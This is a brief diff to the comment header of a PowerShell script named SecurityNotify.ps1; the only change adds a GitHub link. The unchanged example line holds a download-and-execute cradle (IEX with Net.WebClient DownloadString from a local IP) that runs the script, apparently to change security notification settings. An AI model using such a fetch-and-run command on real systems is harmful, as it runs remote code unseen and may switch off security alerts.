@@ -6,7 +6,7 @@
 	File Name  : SecurityNotify.ps1
 	Author     : Gushmazuko
 .LINK
-
+	https://github.com/gushmazuko/tools/blob/master/SecurityNotify.ps1
 .EXAMPLE
 	powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://192.168.0.30/SecurityNotify.ps1'); SecurityNotify -set 0
 	
